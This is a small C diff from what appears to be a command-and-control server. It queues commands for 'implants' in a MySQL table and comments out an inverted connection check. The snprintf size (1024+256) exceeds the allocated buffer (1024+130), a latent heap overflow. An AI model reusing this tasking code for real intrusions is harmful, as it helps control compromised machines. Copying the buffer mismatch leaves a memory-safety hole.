@@ -201,10 +201,11 @@ void new_tasks(MYSQL* con, char *implant_id, char *command) {
     mysql_real_escape_string(con, esc_cmd, command, strlen(command));
     char *query = malloc(1024 + 130);
     snprintf(query, 1024 + 256, "INSERT INTO Tasks (implant_id, command) VALUES ('%s', '%s');", esc_id, esc_cmd);
-    if (mysql_ping(con) == 0) {
-        free(query);
-        return;
-    }
+    //if (mysql_ping(con) == 0) {
+    //    log_message(LOG_ERROR, "No mysql Connection");
+    //    free(query);
+    //    return;
+    //}
 
     if (mysql_query(con, query)) {
         log_message(LOG_ERROR, "Inserting New Tasks Query Failed: %s", mysql_error(con));
